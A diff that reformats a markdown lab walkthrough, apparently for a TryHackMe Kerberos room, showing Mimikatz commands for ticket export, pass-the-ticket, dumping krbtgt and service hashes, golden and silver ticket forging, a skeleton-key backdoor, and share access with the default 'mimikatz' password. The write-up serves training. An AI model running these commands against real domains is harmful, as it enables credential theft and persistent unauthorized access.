@@ -154,39 +154,49 @@ hashcat --show hash.txt
 ---
 Now we will start exploring the use of Mimikatz. 
 first things first ensure you have proper permissions to run mimikatz
+
 do so by entering 
-```cmd
+
+```shell
 privilege::debug
 ```
 
 you should see the following output.
+
 ![](/assets/images/thm/kerberos/mimikatz-priv.png)
 
 one thing we can do is grab all available client tickets on the machine.
-```cmd
+
+```shell
 sekurlsa::tickets /export
 ```
 
 You will see a lot of output like the following. This command just grabbed all the available tickets and placed them within your working directory. In this case, Downloads.
+
 ![](/assets/images/thm/kerberos/mimikatz-tickets1.png)
 
 You can see this in file explorer here
+
 ![](/assets/images/thm/kerberos/mimikatz-tickets2.png)
 
 now to  "login" as one of these users using the following command.
-```cmd
+
+```shell
 kerberos::ptt [0;77e19]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL
 ```
 
 You should receive this output.
+
 ![](/assets/images/thm/kerberos/mimikatz-tickets3.png)
 
 To see if we are now accessing the other account you will want to exit mimikatz and run
-```cmd
+
+```shell
 klist
 ```
 
 Here you will see the client is now showing as Admin
+
 ![](/assets/images/thm/kerberos/mimikatz-tickets4.png)
 
 You have successfully passed the hash!!
@@ -198,59 +208,71 @@ You have successfully passed the hash!!
 Here we will be discussing how to make a silver ticket. As stated in the task, "KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want."
 
 To start this off we will need to start off the same way as we did in the other mimikatz tasks.
-```cmd
+
+```shell
 mimikatz.exe 
 ```
 
 and
-```cmd
+
+```shell
 privilege::debug
 ```
 
 Then we will run 
-```cmd
+
+```shell
 lsadump::lsa /inject /name:krbtgt
 ```
+
 As stated in the task, "This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account."
 
 Example output below
+
 ![](/assets/images/thm/kerberos/mimikatz1.png)
 ![](/assets/images/thm/kerberos/mimikatz2.png)
 
 As the task said "This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103."
 
 golden
-```cmd
+
+```shell
 Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt:<NTLM HASH> /id:500
 ```
 
 silver
-```cmd
+
+```shell
 Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt:<NTLM HASH> /id:1103
 ```
 
 ![](/assets/images/thm/kerberos/mimikatz3.png)
 
 This will spawn a new command prompt with the privileges of the new ticket
-```cmd
+
+```shell
 misc::cmd
 ```
 
 
 Do the first step we did to dump the NTLM hash but change the name to Administrator
-```cmd
+
+```shell
 lsadump::lsa /inject /name:Administrator
 ```
 
 The output will provide your answer for the task.
+
 ![](/assets/images/thm/kerberos/mimikatz-admin.png)
 
 Same here but name = sqlservice
-```cmd
+
+```shell
 lsadump::lsa /inject /name:sqlservice
 ```
 
 The output will provide your answer for the task.
+
 ![](/assets/images/thm/kerberos/mimikatz-sql.png)
 
 
@@ -263,32 +285,38 @@ As discussed in the task " A Kerberos backdoor acts similar to a rootkit by impl
 simply follow these commands
 
 To start Mimikatz
-```cmd
+
+```shell
 mimikatz.exe
 ```
 
 To check if your privilege is ok
-```cmd
+
+```shell
 privilege::debug
 ```
 
 ![](/assets/images/thm/kerberos/mimikatz-priv.png)
 
 To get your skeleton key
-```cmd
+
+```shell
 misc::skeleton
 ```
 
 ![](/assets/images/thm/kerberos/mimikatz-skel.png)
+
 now you will be able to access nearly anything you need or require. As stated in the task 'The default hash for a mimikatz skeleton key is _60BA4FCADC466C7A033C178194C03DF6_ which makes the password -"_mimikatz_" '
 
 for example to access the admin share you could use this command.
-```cmd
+
+```shell
 net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
 ```
 
 to access directories you could use a command similar to:
-```cmd
+
+```shell
 dir \\Desktop-1\c$ /user:Machine1 mimikatz
 ```
 
